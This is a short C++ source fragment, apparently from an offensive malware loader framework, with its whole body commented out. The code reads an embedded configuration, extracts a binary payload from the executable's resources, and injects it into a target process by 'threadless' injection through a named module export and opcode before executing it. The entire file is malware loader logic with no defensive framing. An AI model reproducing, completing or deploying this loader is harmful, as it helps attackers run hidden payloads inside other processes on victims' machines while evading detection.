#include <loader/include/injectlib.hpp>
/*
namespace Rsrc {

    VOID RsrcLoader(HMODULE Base) {

            PRSRC Rsrc              = { };
            PARSER Parser           = { };
            THREADLESS Threadless   = { };

            Memory::ResolveApi();
            Parser::CreateParser(&Parser, Config, sizeof(Config));

            x_memset(Config, 0, sizeof(Config));
            //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);

            Parser::ParserStrcpy(&Parser, R_CAST(LPSTR*, &Ctx->Config.Key), nullptr);
            Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->Root), nullptr);
            Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->LE), nullptr);

            Parser::ParserStrcpy(&Parser, &Threadless.Parent.Buffer, &Threadless.Parent.Length);
            Parser::ParserStrcpy(&Parser, &Threadless.Module.Buffer, &Threadless.Module.Length);
            Parser::ParserStrcpy(&Parser, &Threadless.Export.Buffer, &Threadless.Export.Length);
            Parser::ParserStrcpy(&Parser, &Threadless.Opcode.Buffer, &Threadless.Opcode.Length);
            Parser::ParserStrcpy(&Parser, &Threadless.Loader.Buffer, &Threadless.Loader.Length);

            Parser::DestroyParser(&Parser);
            if (!(Rsrc = Memory::LdrGetIntResource(Base, IDR_RSRC_BIN1))) {
                    return;
            }

            Injection::Threadless(Threadless, Rsrc->ResLock, Rsrc->Size, Threadless.Loader.Length + Rsrc->Size);

            Ctx->win32.FreeResource(Rsrc->hGlobal);
            Parser::DestroyParser(&Parser);

            Execute();
    }
}

VOID Entrypoint(HMODULE Base) {
        Memory::ContextInit();
        Rsrc::RsrcLoader(Base);
}
 */
